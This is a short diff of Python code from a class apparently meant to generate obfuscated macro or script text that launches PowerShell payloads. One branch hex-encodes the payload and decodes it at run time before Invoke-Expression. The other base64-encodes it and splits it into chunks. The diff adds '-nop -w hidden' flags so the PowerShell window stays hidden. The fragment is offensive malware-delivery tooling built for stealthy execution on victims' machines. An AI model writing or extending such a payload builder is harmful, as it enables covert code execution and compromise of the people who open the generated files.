@@ -36,13 +36,13 @@ class  Maker_Code:
                with open('.output','r') as output:
                          Command1 = output.read()
                    
-               Command2 = ('Hex ="powershell.exe $hexString ='+"'"+'"& _\n'+ Command1).replace("\n",'',1).replace("\t\t",'',1).replace(' "','"').strip()
+               Command2 = ('Hex ="powershell.exe -nop -w hidden  $hexString ='+"'"+'"& _\n'+ Command1).replace("\n",'',1).replace("\t\t",'',1).replace(' "','"').strip()
                Convert  = '"'+";$hexString.Split(' ') | forEach {[char]([convert]::toint16($_,16))}"+'"& _\n'
                Convert  += '''\t"| forEach {$result = $result + $_};Set-Variable -Name 'ROT' -Value ($result);Invoke-Expression $ROT "'''
                Do +='\t'+Command2+'\n\t'+Convert
                os.remove('.output')
             else:
-                Command  = "powershell -e " + base64.b64encode(payload.encode('utf-16')[2:]).decode()
+                Command  = "powershell.exe -nop -w hidden -e " + base64.b64encode(payload.encode('utf-16')[2:]).decode()
                 for i in range(0,len(Command),String_len):            
                     Commandloop = "Str= str+" + '"' + Command[i:i+String_len] +'"'+'\n'
                     Do +='\t'+Commandloop
